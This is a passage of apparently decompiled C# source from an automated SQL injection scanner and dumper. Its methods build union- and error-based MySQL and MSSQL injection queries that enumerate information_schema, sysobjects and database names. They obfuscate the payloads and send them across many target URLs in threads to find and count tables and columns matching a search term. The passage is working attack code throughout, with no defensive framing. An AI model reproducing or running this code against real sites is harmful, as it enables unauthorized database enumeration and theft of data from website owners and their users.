				    using (HTTP hTTP = new HTTP(this.__Analizer.TimeOut, false))
				    {
					    List<string> list3 = new List<string>();
					    string[] array = new string[2];
					    string text2 = "";
					    List<string> list4 = new List<string>();
					    switch (oType)
					    {
					    case Types.MySQL_No_Error:
					    case Types.MySQL_With_Error:
					    {
						    list3.AddRange(new string[]
						    {
							    "d.schema_name",
							    "t.table_name"
						    });
						    string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) ", Interaction.IIf(this.__Analizer.CheckColumns.CurrentDB, "and d.schema_name = database() ", " ")), "and c.column_name like "), Globals.G_Utilities.ConvertTextToHex("%" + sColumn + "%")), " # "), "group by t.table_name"));
						    int num = this.AnalizerColumnCount(oType, sBuilUrl, "t.table_name", text3.Replace("group by t.table_name", "").Replace("#", ""), oMySQLCollation, bMSSQLCollateLatin);
						    text3 += " limit [x],[y]";
						    if (num == 0)
						    {
							    string result = "";
							    return result;
						    }
						    if (oType == Types.MySQL_No_Error)
						    {
							    text3 = text3.Replace("#", "");
							    while (true)
							    {
								    int i = 0;
								    if (t.Threads == 1)
								    {
									    Globals.UpDateStatus(__Analizer.Order, "", string.Concat(new string[]
									    {
										    "[",
										    Conversions.ToString(t.ID + 1),
										    "/",
										    Conversions.ToString(this.__Analizer.Urls.Count),
										    "] Analizer thread, search column '",
										    sColumn,
										    "' [Count Row ",
										    Conversions.ToString(i + 1),
										    "/",
										    Conversions.ToString(num),
										    " | ",
										    Globals.G_Utilities.GetDomain(t.URL)
									    }));
								    }
								    string text4 = MySQLNoError.Dump(sBuilUrl, unchecked(((bMSSQLCollateLatin) )) ? MySQLCollactions.UnHex : MySQLCollactions.None, false, false, "", "", list3, i, 1, "", "", "", text3);
								    Globals.G_Tools.CheckSQLiStringOfuscation(ref text4);
								    if (this.AnalizerCheckForCancel())
								    {
									    break;
								    }
								    HTTP arg_257_0 = hTTP;
								    string arg_257_1 = text4;
								    enHTTPMethod arg_257_2 = enHTTPMethod.GET;
								    string text5 = "";
								    object arg_257_4 = null;
								    NetworkCredential arg_257_5 = null;
								    bool arg_257_6 = true;
								    string text6 = "";
								    string hTML = arg_257_0.GetHTML(arg_257_1, arg_257_2, ref text5, arg_257_4, arg_257_5, arg_257_6, ref text6);
								    if (!string.IsNullOrEmpty(hTML))
								    {
									    List<string> list5 = Globals.G_Dumper.ParseHtmlData(hTML, oType);
									    if (list5.Count <= 0)
									    {
										    break;
									    }
									    array = Strings.Split(list5[0], Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
									    if (array.Length <= 1 || list4.Contains(array[1]))
									    {
										    break;
									    }
									    string sFrom = "from " + array[0] + "." + array[1];
									    int num2 = this.AnalizerColumnCount(oType, sBuilUrl, "*", sFrom, oMySQLCollation, bMSSQLCollateLatin);
									    if (num2 > 0)
									    {
										    string item = string.Concat(new string[]
										    {
											    "[",
											    Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
											    "] ",
											    array[0],
											    ".",
											    array[1]
										    });
										    list.Add(item);
										    list4.Add(array[1]);
										    num3 += unchecked((long)num2);
									    }
									    int num4 = 0;
									    i++;
									    Thread.Sleep(this.__Analizer.Delay);
									    if (!bAllResults)
									    {
										    break;
									    }
									    if (i > num)
									    {
										    break;
									    }
								    }
								    else
								    {
									    int num4 = 0;
									    num4++;
									    if (num4 >= this.__Analizer.Retry)
									    {
										    break;
									    }
								    }
							    }
						    }
						    else if (oType == Types.MySQL_With_Error)
						    {
							    string text7 = text3;
							    List<string> list6 = new List<string>();
							    int arg_48D_0 = 0;
							    int num5 = num - 1;
							    int i = arg_48D_0;
							    while (i <= num5)
							    {
								    if (list6.Count > 0)
								    {
									    string text8 = " and not t.table_name in (";
									    int arg_4B1_0 = 0;
									    int num6 = list6.Count - 1;
									    for (int j = arg_4B1_0; j <= num6; j++)
									    {
										    if (j != 0)
										    {
											    text8 += ",";
										    }
										    text8 += Globals.G_Utilities.ConvertTextToHex(list6[j]);
									    }
									    text8 += ")";
									    text3 = text7.Replace("#", text8);
								    }
								    else
								    {
									    text3 = text7.Replace("#", "");
								    }
								    int num7 = 0;
								    do
								    {
									    if (this.__Analizer.CheckColumns.CurrentDB & !string.IsNullOrEmpty(text2) & num7 == 0)
									    {
										    array[0] = text2;
									    }
									    else
									    {
										    if (t.Threads == 1)
										    {
											    Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
											    {
												    "[",
												    Conversions.ToString(t.ID + 1),
												    "/",
												    Conversions.ToString(this.__Analizer.Urls.Count),
												    "] Analizer thread, search column '",
												    sColumn,
												    "' [Count Row ",
												    Conversions.ToString(i + 1),
												    "/",
												    Conversions.ToString(num),
												    "] [",
												    Conversions.ToString(num7 + 1),
												    "/2] | ",
												    Globals.G_Utilities.GetDomain(t.URL)
											    }));
										    }
										    list3.Clear();
										    switch (num7)
										    {
										    case 0:
											    list3.Add("d.schema_name");
											    break;
										    case 1:
											    list3.Add("t.table_name");
											    break;
										    }
										    string text4 = MySQLWithError.Dump(sBuilUrl, oMySQLCollation, MySQLErrorType.DuplicateEntry, false, "", "", list3, i, 1, "", "", "", text3);
										    Globals.G_Tools.CheckSQLiStringOfuscation(ref text4);
										    if (this.AnalizerCheckForCancel())
										    {
											    break;
										    }
										    HTTP arg_688_0 = hTTP;
										    string arg_688_1 = text4;
										    enHTTPMethod arg_688_2 = enHTTPMethod.GET;
										    string text6 = "";
										    object arg_688_4 = null;
										    NetworkCredential arg_688_5 = null;
										    bool arg_688_6 = true;
										    string text5 = "";
										    string hTML = arg_688_0.GetHTML(arg_688_1, arg_688_2, ref text6, arg_688_4, arg_688_5, arg_688_6, ref text5);
										    if (!string.IsNullOrEmpty(hTML))
										    {
											    List<string> list7 = Globals.G_Dumper.ParseHtmlData(hTML, oType);
											    if (list7.Count <= 0)
											    {
												    break;
											    }
											    array[num7] = list7[0];
											    if (num7 == 1)
											    {
												    if (list4.Contains(array[1]))
												    {
													    break;
												    }
												    list4.Add(array[1]);
											    }
											    if (num7 == 0)
											    {
												    text2 = list7[0];
											    }
											    int num4 = 0;
										    }
										    else
										    {
											    int num4 = 0;
											    num4++;
											    if (num4 >= this.__Analizer.Retry)
											    {
												    break;
											    }
										    }
										    Thread.Sleep(this.__Analizer.Delay);
									    }
									    num7++;
								    }
								    while (num7 <= 1);
								    IL_757:
								    if (string.IsNullOrEmpty(array[0]) || string.IsNullOrEmpty(array[1]))
								    {
									    break;
								    }
								    string sFrom2 = "from " + array[0] + "." + array[1];
								    int num2 = this.AnalizerColumnCount(oType, sBuilUrl, "*", sFrom2, oMySQLCollation, bMSSQLCollateLatin);
								    if (num2 > 0)
								    {
									    string item2 = string.Concat(new string[]
									    {
										    "[",
										    Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
										    "] ",
										    array[0],
										    ".",
										    array[1]
									    });
									    list.Add(item2);
									    list6.Add(array[1]);
									    num3 += unchecked((long)num2);
								    }
								    array = new string[3];
								    if (bAllResults)
								    {
									    Thread.Sleep(this.__Analizer.Delay);
									    i++;
									    continue;
								    }
								    break;
								    goto IL_757;
							    }
						    }
						    break;
					    }
					    case Types.MSSQL_No_Error:
					    case Types.MSSQL_With_Error:
					    {
						    InjectionType oError = InjectionType.None;
						    switch (oType)
						    {
						        case Types.MSSQL_No_Error:
							        oError = InjectionType.Union;
							        break;
						        case Types.MSSQL_With_Error:
							        oError = InjectionType.Error;
							        break;
						    }
						    int i = 0;
						    int num4 = 0;
						    if (list2.Count == 0)
						    {
							    string hTML;
							    do
							    {
								    if (t.Threads == 1)
								    {
									    Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
									    {
										    "[",
										    Conversions.ToString(t.ID + 1),
										    "/",
										    Conversions.ToString(this.__Analizer.Urls.Count),
										    "] Analizer thread, search column '",
										    sColumn,
										    "' Loading Current DB | ",
										    Globals.G_Utilities.GetDomain(t.URL)
									    }));
								    }
								    string text4 = MSSQL.Info(sBuilUrl, oError, bMSSQLCollateLatin, new List<string>
								    {
									    "DB_NAME()"
								    }, "char", "");
								    Globals.G_Tools.CheckSQLiStringOfuscation(ref text4);
								    HTTP arg_8BE_0 = hTTP;
								    string arg_8BE_1 = text4;
								    enHTTPMethod arg_8BE_2 = enHTTPMethod.GET;
								    string text6 = "";
								    object arg_8BE_4 = null;
								    NetworkCredential arg_8BE_5 = null;
								    bool arg_8BE_6 = true;
								    string text5 = "";
								    hTML = arg_8BE_0.GetHTML(arg_8BE_1, arg_8BE_2, ref text6, arg_8BE_4, arg_8BE_5, arg_8BE_6, ref text5);
								    if (!string.IsNullOrEmpty(hTML))
								    {
									    goto IL_980;
								    }
								    num4++;
							    }
							    while (num4 < this.__Analizer.Retry);
							    return text;
							    IL_980:
							    List<string> list8 = Globals.G_Dumper.ParseHtmlData(hTML, oType);
							    if (list8.Count != 0)
							    {
								    list2.Add(list8[0]);
							    }
							    num4 = 0;
							    i = 0;
							    if (!this.__Analizer.CheckColumns.CurrentDB)
							    {
								    while (true)
								    {
									    if (t.Threads == 1)
									    {
                                            Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
										    {
											    "[",
											    Conversions.ToString(t.ID + 1),
											    "/",
											    Conversions.ToString(this.__Analizer.Urls.Count),
											    "] Analizer thread, search column '",
											    sColumn,
											    "' Loading DB ",
											    Conversions.ToString(i),
											    " | ",
											    Globals.G_Utilities.GetDomain(t.URL)
										    }));
									    }
									    list8.Clear();
									    list8.Add("DB_NAME(" + Conversions.ToString(i) + ")");
									    if (this.AnalizerCheckForCancel())
									    {
										    break;
									    }
									    string text4 = MSSQL.Info(sBuilUrl, oError, bMSSQLCollateLatin, list8, "char", "");
									    Globals.G_Tools.CheckSQLiStringOfuscation(ref text4);
									    HTTP arg_A34_0 = hTTP;
									    string arg_A34_1 = text4;
									    enHTTPMethod arg_A34_2 = enHTTPMethod.GET;
									    string text6 = "";
									    object arg_A34_4 = null;
									    NetworkCredential arg_A34_5 = null;
									    bool arg_A34_6 = true;
									    string text5 = "";
									    hTML = arg_A34_0.GetHTML(arg_A34_1, arg_A34_2, ref text6, arg_A34_4, arg_A34_5, arg_A34_6, ref text5);
									    if (!string.IsNullOrEmpty(hTML))
									    {
										    list8 = Globals.G_Dumper.ParseHtmlData(hTML, oType);
										    if (list8.Count == 0)
										    {
											    goto IL_B70;
										    }
										    if (!list2.Contains(list8[0]))
										    {
											    list2.Add(list8[0]);
										    }
										    num4 = 0;
										    i++;
										    Thread.Sleep(this.__Analizer.Delay);
									    }
									    else
									    {
										    num4++;
										    if (num4 >= this.__Analizer.Retry)
										    {
											    break;
										    }
									    }
								    }
								    return text;
							    }
						    }
						    IL_B70:
						    num4 = 0;
						    i = 0;
						    if (list2.Contains("master"))
						    {
							    list2.Remove("master");
						    }
						    if (list2.Contains("model"))
						    {
							    list2.Remove("model");
						    }
						    if (list2.Contains("msdb"))
						    {
							    list2.Remove("msdb");
						    }
						    if (list2.Contains("tempdb"))
						    {
							    list2.Remove("tempdb");
						    }
						    if (list2.Count == 0)
						    {
							    return text;
						    }
						    if (!this.AnalizerCheckColumn_cDBS.ContainsKey(sBuilUrl) & !this.AnalizerCheckForCancel())
						    {
							    this.AnalizerCheckColumn_cDBS.Add(sBuilUrl, list2);
						    }
						    while (i <= list2.Count - 1)
						    {
							    string text9 = list2[i];
							    string text3 = "select cast(count(t.name) as char) as x from [" + text9 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like " + Globals.G_Utilities.ConvertTextToSQLChar("%" + sColumn + "%", false, "+", "char");
							    if (t.Threads == 1)
							    {
                                    Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
								    {
									    "[",
									    Conversions.ToString(t.ID + 1),
									    "/",
									    Conversions.ToString(this.__Analizer.Urls.Count),
									    "] Analizer thread, search column '",
									    sColumn,
									    "' [",
									    Conversions.ToString(i + 1),
									    "/",
									    Conversions.ToString(list2.Count),
									    "] Checking Tables on DB '",
									    text9,
									    "'  | ",
									    Globals.G_Utilities.GetDomain(t.URL)
								    }));
							    }
							    int num = this.AnalizerColumnCount(oType, sBuilUrl, "", text3, oMySQLCollation, bMSSQLCollateLatin);
							    text3 = string.Concat(new string[]
							    {
								    "select top 1 x from ( select distinct top [x] (t.name) as x from [",
								    text9,
								    "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like ",
								    Globals.G_Utilities.ConvertTextToSQLChar("%" + sColumn + "%", false, "+", "char"),
								    " order by x asc) sq order by x desc"
							    });
							    if (num != 0)
							    {
								    int num8 = 0;
								    while (true)
								    {
									    if (t.Threads == 1)
									    {
                                            Globals.UpDateStatus(__Analizer.Order, "Injecter", string.Concat(new string[]
										    {
											    "[",
											    Conversions.ToString(t.ID + 1),
											    "/",
											    Conversions.ToString(this.__Analizer.Urls.Count),
											    "] Analizer thread, search column '",
											    sColumn,
											    "' [",
											    Conversions.ToString(i + 1),
											    "/",
											    Conversions.ToString(list2.Count),
											    "]  DB '",
											    text9,
											    "' Table ",
											    Conversions.ToString(num8),
											    " | ",
											    Globals.G_Utilities.GetDomain(t.URL)
										    }));
									    }
									    string text4 = MSSQL.Dump(sBuilUrl, "", "", null, false, (InjectionType)oType, "char", bMSSQLCollateLatin, num8, 0, "", "", "", text3, -1);
									    Globals.G_Tools.CheckSQLiStringOfuscation(ref text4);
									    if (this.AnalizerCheckForCancel())
									    {
										    break;
									    }
									    HTTP arg_E11_0 = hTTP;
									    string arg_E11_1 = text4;
									    enHTTPMethod arg_E11_2 = enHTTPMethod.GET;
									    string text6 = "";
									    object arg_E11_4 = null;
									    NetworkCredential arg_E11_5 = null;
									    bool arg_E11_6 = true;
									    string text5 = "";
									    string hTML = arg_E11_0.GetHTML(arg_E11_1, arg_E11_2, ref text6, arg_E11_4, arg_E11_5, arg_E11_6, ref text5);
									    if (!string.IsNullOrEmpty(hTML))
									    {
										    List<string> list8 = Globals.G_Dumper.ParseHtmlData(hTML, oType);
										    if (list8.Count <= 0)
										    {
											    goto IL_106E;
										    }
										    array = Strings.Split(list8[0], Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
										    if (array.Length <= 0 || list4.Contains(array[0]))
										    {
											    goto IL_106E;
										    }
										    string sFrom3 = string.Concat(new string[]
										    {
											    "select cast(isnull(count(*),char(32)) as char) as x from [",
											    text9,
											    "]..[",
											    array[0],
											    "]"
										    });
										    int num2 = this.AnalizerColumnCount(oType, sBuilUrl, "*", sFrom3, oMySQLCollation, bMSSQLCollateLatin);
										    if (num2 > 0)
										    {
											    string item3 = string.Concat(new string[]
											    {
												    "[",
												    Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												    "] ",
												    text9,
												    ".",
												    array[0]
											    });
											    list.Add(item3);
											    list4.Add(array[0]);
											    num3 += unchecked((long)num2);
										    }
										    else if (num2 == -1)
										    {
											    goto IL_106E;
										    }
										    num4 = 0;
										    Thread.Sleep(this.__Analizer.Delay);
										    if (!bAllResults)
										    {
											    goto IL_106E;
										    }
										    num8++;
										    if (num8 > num)
										    {
											    goto IL_106E;
										    }
									    }
									    else
									    {
										    num4++;
										    if (num4 >= this.__Analizer.Retry)
										    {
											    goto Block_75;
										    }
									    }
								    }
								    return text;
								    IL_106E:
								    Thread.Sleep(this.__Analizer.Delay);
								    i++;
								    continue;
								    Block_75:
								    goto IL_106E;
							    }
							    i++;
						    }
						    break;
					    }
					    case Types.Oracle_No_Error:
					    case Types.Oracle_With_Error:
					    {
						    string result = "";
						    return result;
					    }
					    }
				    }
				    list.Sort();
				    if (list.Count > 0)
				    {
					    text = string.Concat(new string[]
					    {
						    "Search Column '",
						    sColumn,
						    "' Count rows ",
						    Strings.FormatNumber(num3, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
						    ", Match in ",
						    Strings.FormatNumber(list.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
						    " Tables "
					    });
					    try
					    {
						    List<string>.Enumerator enumerator = list.GetEnumerator();
						    while (enumerator.MoveNext())
						    {
							    string current = enumerator.Current;
							    text = text + "; " + current;
						    }
					    }
					    finally
					    {
						    List<string>.Enumerator enumerator = new List<string>.Enumerator();
						    ((IDisposable)enumerator).Dispose();
					    }
					    /*if (this.__ScannerSearchCol != null && this.__ScannerSearchCol.Visible)
					    {
						    this.__ScannerSearchCol.Add(sBuilUrl, Utls.TypeToString(oType), sColumn, (int)num3, list);
					    }*/
				    }
			    /*}
			    catch (Exception expr_119B)
			    {
				    ProjectData.SetProjectError(expr_119B);
				    ProjectData.ClearProjectError();
			    }*/
			    return text;
		    }
	    }
	    private string AnalizerCheckTable(ThreadAnalizer t, Types oType, string sBuilUrl, string sTable, bool bAllResults, MySQLCollactions oMySQLCollation, bool bMSSQLCollateLatin)
        {
            string str2 = "";
            List<string> lTables = new List<string>();
            List<string> list = new List<string>();
            bool lockTaken = false;
           /* try
            {*/
                Monitor.Enter(this.AnalizerCheckTable_cDBS_Init, ref lockTaken);
                if (this.AnalizerCheckTable_cDBS_Init.State == 0)
                {
                    this.AnalizerCheckTable_cDBS_Init.State = 2;
                    this.AnalizerCheckTable_cDBS = new Dictionary<string, List<string>>();
                }
                else if (this.AnalizerCheckTable_cDBS_Init.State == 2)
                {
                    throw new IncompleteInitialization();
                }
            /*}
            finally
            {
                this.AnalizerCheckTable_cDBS_Init.State = 1;
                if (lockTaken)
                {
                    Monitor.Exit(this.AnalizerCheckTable_cDBS_Init);
                }
            }*/
           /* try
            {*/
                long num = 0;
                List<string>.Enumerator enumerator = new List<string>.Enumerator();
                if (this.AnalizerCheckTable_cDBS.ContainsKey(sBuilUrl))
                {
                    list = this.AnalizerCheckTable_cDBS[sBuilUrl];
                }
                using (HTTP http = new HTTP(this.__Analizer.TimeOut, false))
                {
                    int num2 = 0;
                    int num3 = 0;
                    int num4 = 0;
                    int num5 = 0;
                    string str3 = string.Empty;
                    string str5 = string.Empty;
                    string str6 = string.Empty;
                    List<string> list8 = new List<string>();
                    InjectionType type = InjectionType.None;
                    string str18 = string.Empty;
                    string str19 = string.Empty;
                    List<string> lColumn = new List<string>();
                    string[] strArray = new string[2];
                    string str4 = string.Empty;
                    List<string> list3 = new List<string>();
                    switch (oType)
                    {
                        case Types.MySQL_No_Error:
                        case Types.MySQL_With_Error:
                            lColumn.AddRange(new string[] { "d.schema_name", "t.table_name" });
                            str5 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) ", Interaction.IIf(this.__Analizer.CheckColumns.CurrentDB, "and d.schema_name = database() ", " ")), "and t.table_name like "), Globals.G_Utilities.ConvertTextToHex("%" + sTable + "%")), " # "), "group by t.table_name"));
                            num3 = this.AnalizerColumnCount(oType, sBuilUrl, "t.table_name", str5.Replace("group by t.table_name", "").Replace("#", ""), oMySQLCollation, bMSSQLCollateLatin);
                            str5 = str5 + " limit [x],[y]";
                            if (num3 != 0)
                            {
                                break;
                            }
                            return "";

                        case Types.MSSQL_No_Error:
                        case Types.MSSQL_With_Error:
                            switch (oType)
                            {
                                case Types.MSSQL_No_Error:
                                    goto Label_0854;

                                case Types.MSSQL_With_Error:
                                    goto Label_0859;
                            }
                            goto Label_085C;

                        case Types.Oracle_No_Error:
                        case Types.Oracle_With_Error:
                            return "";

                        default:
                            goto Label_10B3;
                    }
                    if (oType != Types.MySQL_No_Error)
                    {
                        goto Label_0474;
                    }
                    str5 = str5.Replace("#", "");
                    goto Label_044F;
                Label_01F5:
                    str6 = MySQLNoError.Dump(sBuilUrl, (MySQLCollactions.ConvertLatin1), false, false, "", "", lColumn, num4, 1, "", "", "", str5);
                    Globals.G_Tools.CheckSQLiStringOfuscation(ref str6);

                    Globals.G_Tools.CheckSQLiStringOfuscation(ref str6);
                    if (!this.AnalizerCheckForCancel())
                    {
                        str18 = "";
                        str19 = "";
                        str3 = http.GetHTML(str6, enHTTPMethod.GET, ref str18, null, null, true, ref str19);
                        if (!string.IsNullOrEmpty(str3))
                        {
                            List<string> list5 = Globals.G_Dumper.ParseHtmlData(str3, oType);
                            if (list5.Count > 0)
                            {
                                strArray = Strings.Split(list5[0], Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
                                if ((strArray.Length > 1) && !list3.Contains(strArray[1]))
                                {
                                    string sFrom = "from " + strArray[0] + "." + strArray[1];
                                    num2 = this.AnalizerColumnCount(oType, sBuilUrl, "*", sFrom, oMySQLCollation, bMSSQLCollateLatin);
                                    if (num2 > 0)
                                    {
                                        string item = "[" + Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] " + strArray[0] + "." + strArray[1];
                                        lTables.Add(item);
                                        list3.Add(strArray[1]);
                                        num += num2;
                                    }
                                    num5 = 0;
                                    num4++;
                                    Thread.Sleep(this.__Analizer.Delay);
                                    if (bAllResults && (num4 <= num3))
                                    {
                                        goto Label_044F;
                                    }
                                }
                            }
                        }
                        else
                        {
                            num5++;
                            if (num5 < this.__Analizer.Retry)
                            {
                                goto Label_044F;
                            }
                        }
                    }
                    goto Label_10B3;
                Label_03A0:;
                    Globals.UpDateStatus(__Analizer.Order, "Inecter", "[" + Conversions.ToString((int) (t.ID + 1)) + "/" + Conversions.ToString(this.__Analizer.Urls.Count) + "] Analizer thread, search table '" + sTable + "' [Count Row " + Conversions.ToString((int) (num4 + 1)) + "/" + Conversions.ToString(num3) + " | " + Globals.G_Utilities.GetDomain(t.URL));
                    goto Label_01F5;
                Label_044F:
                    if (t.Threads != 1)
                    {
                        goto Label_01F5;
                    }
                    goto Label_03A0;
                Label_0474:
                    if (oType == Types.MySQL_With_Error)
                    {
                        string str9 = str5;
                        List<string> list6 = new List<string>();
                        int num9 = num3 - 1;
                        for (num4 = 0; num4 <= num9; num4++)
                        {
                            if (list6.Count > 0)
                            {
                                string newValue = " and not t.table_name in (";
                                int num10 = list6.Count - 1;
                                for (int i = 0; i <= num10; i++)
                                {
                                    if (i != 0)
                                    {
                                        newValue = newValue + ",";
                                    }
                                    newValue = newValue + Globals.G_Utilities.ConvertTextToHex(list6[i]);
                                }
                                newValue = newValue + ")";
                                str5 = str9.Replace("#", newValue);
                            }
                            else
                            {
                                str5 = str9.Replace("#", "");
                            }
                            int index = 0;
                            while (!((this.__Analizer.CheckColumns.CurrentDB & !string.IsNullOrEmpty(str4)) & (index == 0)))
                            {
                                if (t.Threads == 1)
                                {
                                    Globals.UpDateStatus(__Analizer.Order, "Inecter", "[" + Conversions.ToString((int)(t.ID + 1)) + "/" + Conversions.ToString(this.__Analizer.Urls.Count) + "] Analizer thread, search table '" + sTable + "' [Count Row " + Conversions.ToString((int)(num4 + 1)) + "/" + Conversions.ToString(num3) + "] [" + Conversions.ToString((int)(index + 1)) + "/2] | " + Globals.G_Utilities.GetDomain(t.URL));
                                }
                                lColumn.Clear();
                                switch (index)
                                {
                                    case 0:
                                        lColumn.Add("d.schema_name");
                                        break;

                                    case 1:
                                        lColumn.Add("t.table_name");
                                        break;
                                }
                                str6 = MySQLWithError.Dump(sBuilUrl, oMySQLCollation, MySQLErrorType.DuplicateEntry, false, "", "", lColumn, num4, 1, "", "", "", str5);
                                Globals.G_Tools.CheckSQLiStringOfuscation(ref str6);
                                if (this.AnalizerCheckForCancel())
                                {
                                    goto Label_0757;
                                }
                                str19 = "";
                                str18 = "";
                                str3 = http.GetHTML(str6, enHTTPMethod.GET, ref str19, null, null, true, ref str18);
                                if (!string.IsNullOrEmpty(str3))
                                {
                                    List<string> list7 = Globals.G_Dumper.ParseHtmlData(str3, oType);
                                    if (list7.Count <= 0)
                                    {
                                        goto Label_0757;
                                    }
                                    strArray[index] = list7[0];
                                    switch (index)
                                    {
                                        case 1:
                                            if (list3.Contains(strArray[1]))
                                            {
                                                goto Label_0757;
                                            }
                                            list3.Add(strArray[1]);
                                            break;

                                        case 0:
                                            str4 = list7[0];
                                            break;
                                    }
                                    num5 = 0;
                                }
                                else
                                {
                                    num5++;
                                    if (num5 >= this.__Analizer.Retry)
                                    {
                                        goto Label_0757;
                                    }
                                }
                                Thread.Sleep(this.__Analizer.Delay);
                            Label_071A:
                                index++;
                                if (index <= 1)
                                {
                                    continue;
                                }
                                goto Label_0757;
                            Label_0727:
                                strArray[0] = str4;
                                goto Label_071A;
                            }
                            //goto Label_0727;
                        Label_0757:
                            if (string.IsNullOrEmpty(strArray[0]) || string.IsNullOrEmpty(strArray[1]))
                            {
                                break;
                            }
                            string str11 = "from " + strArray[0] + "." + strArray[1];
                            num2 = this.AnalizerColumnCount(oType, sBuilUrl, "*", str11, oMySQLCollation, bMSSQLCollateLatin);
                            if (num2 > 0)
                            {
                                string str12 = "[" + Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] " + strArray[0] + "." + strArray[1];
                                lTables.Add(str12);
                                list6.Add(strArray[1]);
                                num += num2;
                            }
                            strArray = new string[3];
                            if (!bAllResults)
                            {
                                break;
                            }
                            Thread.Sleep(this.__Analizer.Delay);
                        }
                    }
                    goto Label_10B3;
                Label_0854:
                    type = InjectionType.Union;
                    goto Label_085C;
                Label_0859:
                    type = InjectionType.Error;
                Label_085C:
                    if (list.Count != 0)
                    {
                        goto Label_0B70;
                    }
                    goto Label_096F;
                Label_086D:
                    list8 = new List<string>();
                    list8.Add("DB_NAME()");
                    str6 = MSSQL.Info(sBuilUrl, type, bMSSQLCollateLatin, list8, "char", "");
                    Globals.G_Tools.CheckSQLiStringOfuscation(ref str6);
                    str19 = "";
                    str18 = "";
                    str3 = http.GetHTML(str6, enHTTPMethod.GET, ref str19, null, null, true, ref str18);
                    if (!string.IsNullOrEmpty(str3))
                    {
                        goto Label_0980;
                    }
                    num5++;
                    if (num5 < this.__Analizer.Retry)
                    {
                        goto Label_096F;
                    }
                    return str2;
                Label_08EE:;
                Globals.UpDateStatus(__Analizer.Order, "Inecter", "[" + Conversions.ToString((int)(t.ID + 1)) + "/" + Conversions.ToString(this.__Analizer.Urls.Count) + "] Analizer thread, search table '" + sTable + "' Loading Current DB | " + Globals.G_Utilities.GetDomain(t.URL));
                    goto Label_086D;
                Label_096F:
                    if (t.Threads != 1)
                    {
                        goto Label_086D;
                    }
                    goto Label_08EE;
                Label_0980:
                    list8 = Globals.G_Dumper.ParseHtmlData(str3, oType);
                    if (list8.Count != 0)
                    {
                        list.Add(list8[0]);
                    }
                    num5 = 0;
                    num4 = 0;
                    if (this.__Analizer.CheckColumns.CurrentDB)
                    {
                        goto Label_0B70;
                    }
                    goto Label_0B50;
                Label_09C7:
                    list8.Clear();
                    list8.Add("DB_NAME(" + Conversions.ToString(num4) + ")");
                    if (!this.AnalizerCheckForCancel())
                    {
                        str6 = MSSQL.Info(sBuilUrl, type, bMSSQLCollateLatin, list8, "char", "");
                        Globals.G_Tools.CheckSQLiStringOfuscation(ref str6);
                        str19 = "";
                        str18 = "";
                        str3 = http.GetHTML(str6, enHTTPMethod.GET, ref str19, null, null, true, ref str18);
                        if (!string.IsNullOrEmpty(str3))
                        {
                            list8 = Globals.G_Dumper.ParseHtmlData(str3, oType);
                            if (list8.Count == 0)
                            {
                                goto Label_0B70;
                            }
                            if (!list.Contains(list8[0]))
                            {
                                list.Add(list8[0]);
                            }
                            num5 = 0;
                            num4++;
                            Thread.Sleep(this.__Analizer.Delay);
                            goto Label_0B50;
                        }
                        num5++;
                        if (num5 < this.__Analizer.Retry)
                        {
                            goto Label_0B50;
                        }
                    }
                    return str2;
                Label_0AB9:;
                Globals.UpDateStatus(__Analizer.Order, "Inecter", "[" + Conversions.ToString((int)(t.ID + 1)) + "/" + Conversions.ToString(this.__Analizer.Urls.Count) + "] Analizer thread, search table '" + sTable + "' Loading DB " + Conversions.ToString(num4) + " | " + Globals.G_Utilities.GetDomain(t.URL));
                    goto Label_09C7;
                Label_0B50:
                    if (t.Threads != 1)
                    {
                        goto Label_09C7;
                    }
                    goto Label_0AB9;
                Label_0B70:
                    num5 = 0;
                    num4 = 0;
                    if (list.Contains("master"))
                    {
                        list.Remove("master");
                    }
                    if (list.Contains("model"))
                    {
                        list.Remove("model");
                    }
                    if (list.Contains("msdb"))
                    {
                        list.Remove("msdb");
                    }
                    if (list.Contains("tempdb"))
                    {
                        list.Remove("tempdb");
                    }
                    if (list.Count == 0)
                    {
                        return str2;
                    }
                    if (!this.AnalizerCheckTable_cDBS.ContainsKey(sBuilUrl) & !this.AnalizerCheckForCancel())
                    {
                        this.AnalizerCheckTable_cDBS.Add(sBuilUrl, list);
                    }
                    while (num4 <= (list.Count - 1))
                    {
                        string str13 = list[num4];
                        str5 = "select cast(count(t.name) as char) as x from [" + str13 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and t.name like " + Globals.G_Utilities.ConvertTextToSQLChar("%" + sTable + "%", false, "+", "char");
                        if (t.Threads == 1)
                        {
